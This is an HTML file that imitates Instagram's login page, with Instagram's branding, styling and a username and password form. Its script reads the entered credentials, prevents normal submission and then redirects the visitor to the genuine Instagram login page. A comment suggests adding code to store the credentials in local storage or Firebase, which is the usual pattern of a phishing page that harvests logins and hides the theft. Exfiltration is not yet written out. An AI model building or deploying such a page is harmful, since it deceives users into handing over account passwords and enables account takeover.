<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-container {
      background-color: white;
      padding: 50px 30px;
      border-radius: 5px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      width: 350px;
    }

    .login-container h1 {
      text-align: center;
      font-size: 32px;
      color: #262626;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 3px;
      border: 1px solid #dbdbdb;
      box-sizing: border-box;
    }

    .btn-login {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      color: white;
      font-size: 16px;
      font-weight: bold;
      border-radius: 3px;
      border: none;
      cursor: pointer;
      margin-top: 10px;
    }

    .btn-login:hover {
      background-color: #0084d1;
    }

    .signup-link {
      text-align: center;
      margin-top: 20px;
    }

    .signup-link a {
      color: #0095f6;
      font-weight: bold;
    }

    .divider {
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 20px 0;
    }

    .divider::before, .divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .divider span {
      margin: 0 10px;
      color: #8e8e8e;
      font-weight: 500;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <h1>Instagram</h1>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Username" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit" class="btn-login">Log In</button>
    </form>
    <div class="divider">
      <span>OR</span>
    </div>
    <div class="signup-link">
      <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
    </div>
  </div>

  <script>
    // Submit login form and redirect to Instagram
    document.getElementById('loginForm').addEventListener('submit', function(event) {
      event.preventDefault();  // Prevent the form from submitting
      
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      // You can add further code here for local storage or Firebase if needed

      // Redirect to Instagram login page
      window.location.href = "https://www.instagram.com/accounts/login/?hl=en";
    });
  </script>

</body>
</html>
